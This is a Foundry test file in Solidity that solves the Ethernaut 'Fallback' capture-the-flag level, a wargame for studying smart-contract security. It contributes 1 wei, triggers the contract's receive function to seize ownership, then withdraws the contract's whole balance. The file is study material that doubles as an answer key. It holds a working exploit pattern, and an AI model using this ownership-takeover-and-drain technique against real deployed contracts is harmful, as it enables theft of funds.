// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {Ethernaut} from "../src/Ethernaut.sol";
import {FallbackFactory} from "../src/Fallback/FallbackFactory.sol";
import {Fallback} from "../src/Fallback/Fallback.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address payable player;

    error EthTransferFailed();

    function setUp() public {
        ethernaut = new Ethernaut();
        player = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("player")))))
        );
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testExploit() public {
        // Register level with Ethernaut contract
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);

        // Get a new level instance
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback fallbackInstance = Fallback(payable(levelAddress));

        // Simulate exploit
        fallbackInstance.contribute{value: 1 wei}();
        (bool sent, ) = address(fallbackInstance).call{value: 1 wei}("");
        if (sent == false) revert EthTransferFailed();
        assertEq(fallbackInstance.owner(), player);

        fallbackInstance.withdraw();
        assertEq(address(fallbackInstance).balance, 0);
        bool success = ethernaut.submitLevelInstance(
            payable(address(fallbackInstance))
        );
        assertTrue(success);
    }
}
